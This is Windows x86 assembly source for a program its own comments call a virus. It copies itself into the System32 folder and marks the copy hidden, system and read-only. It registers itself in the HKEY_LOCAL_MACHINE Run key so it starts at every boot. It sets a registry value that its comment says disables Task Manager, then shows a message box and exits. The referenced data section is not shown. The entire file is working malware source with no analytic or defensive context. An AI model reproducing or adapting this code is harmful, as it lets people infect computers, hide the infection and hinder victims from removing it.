bits 32
%include "win32n.inc"
 
extern GetModuleHandleA
import GetModuleHandleA kernel32.dll
extern GetModuleFileNameA
import GetModuleFileNameA kernel32.dll
extern GetSystemDirectoryA
import GetSystemDirectoryA kernel32.dll
extern CopyFileA
import CopyFileA kernel32.dll
extern SetFileAttributesA
import SetFileAttributesA kernel32.dll
extern ExitProcess
import ExitProcess kernel32.dll
 
extern MessageBoxA
import MessageBoxA user32.dll
 
extern RegCreateKeyA
import RegCreateKeyA Advapi32.dll
extern RegOpenKeyExA
import RegOpenKeyExA Advapi32.dll
extern RegSetValueExA
import RegSetValueExA Advapi32.dll
extern RegCloseKey
import RegCloseKey Advapi32.dll


section .code USE32
..start:
 
    push DWORD 0x00000000
    call [GetModuleHandleA]
    mov  [Virus_Handle],eax  ;Get Handle of virus
 
    push 0x0104                ;MAX_PATH
    push DWORD Virus_Path
    push DWORD [Virus_Handle]
    call [GetModuleFileNameA] ;Get path of virus
 
    push 0x0104                   ;MAX_PATH
    push DWORD Sys_Dir
    call [GetSystemDirectoryA] ;Find System32
 
    mov  edi,Sys_Dir
    add  edi,eax
    mov  esi,Virus_Name
    cld
    repe  movsb  ;Append virus name to system32 path
 
    push DWORD 0x00000000
    push DWORD Sys_Dir
    push DWORD Virus_Path
    call [CopyFileA]    ;Copy Virus
 
    push DWORD FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM
    push DWORD Sys_Dir
    call [SetFileAttributesA] ;Set virus attributes
 
    push DWORD Key_Handle
    push DWORD KEY_SET_VALUE
    push DWORD 0x00000000
    push DWORD Run
    push DWORD HKEY_LOCAL_MACHINE
    call [RegOpenKeyExA]   ;Open Run key
 
    mov  esi,Sys_Dir    ;Calculate size of string and store in ECX
    xor  ecx,ecx

Path_Size:
    cmp  BYTE [esi],0x00
    jz  done
    inc  ecx
    inc  esi
    jmp  Path_Size
done:
    inc  ecx
 
    push DWORD ecx
    push DWORD Sys_Dir
    push REG_SZ
    push DWORD 0x00000000
    push DWORD Reg_Name
    push DWORD [Key_Handle]
    call [RegSetValueExA]  ;Set registry value
 
    push DWORD [Key_Handle]
    call [RegCloseKey]
 
    xor  eax,eax
    mov  DWORD [Key_Handle],eax ;Clear Key handle
    push DWORD Key_Handle
    push DWORD Task_Man
    push DWORD HKEY_CURRENT_USER
    call [RegCreateKeyA]  
    push DWORD 0x00000004
    push DWORD Key_Value
    push DWORD REG_DWORD
    push DWORD 0x00000000
    push DWORD Task_Man_Key
    push DWORD [Key_Handle]
    call [RegSetValueExA]  ;Disable taskmanager
    push DWORD [Key_Handle]
    call [RegCloseKey]
 
    push DWORD MB_OK|MB_ICONINFORMATION
    push DWORD szTitle
    push DWORD szText
    push DWORD 0x00000000
    call [MessageBoxA]   ;Popup Info box
 
    push DWORD 0x00000000
    call [ExitProcess]   ;Exit